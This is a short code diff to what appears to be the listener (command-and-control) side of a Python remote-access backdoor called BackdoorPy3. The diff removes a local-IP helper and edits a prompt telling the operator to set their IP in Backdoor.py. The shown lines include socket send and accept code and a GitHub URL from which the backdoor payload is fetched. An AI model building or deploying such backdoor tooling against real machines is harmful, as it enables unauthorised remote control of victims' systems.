@@ -7,11 +7,6 @@ import requests
 from termcolor import colored
 count = 1
 
-def get_ip():
-	hostname = socket.gethostname()
-	local_ip = socket.gethostbyname(hostname)
-	return local_ip
-
 def reliable_send(data):
 	if type(data) == bytes:
 		data = data.decode('utf-8')
@@ -125,7 +120,7 @@ def server():
 		except:
 			print(colored("[!] Failed to download Backdoor.py Download it manually from :" , 'red') + colored("\r\n https://raw.githubusercontent.com/Bhadresh-Malankiya/BackdoorPy3/main/Backdoor.py",'blue'))
 
-	print(colored('[+] In Backdoor.py Change host ip to :  ' ,'green')+ get_ip())
+	print(colored('[+] In Backdoor.py Change host ip to your ip ' ,'green'))
 	s.listen(5)
 	print(colored("[!] WARNING : KeyInttrupt may not work during listening..",'red'))
 	accept_conn()	
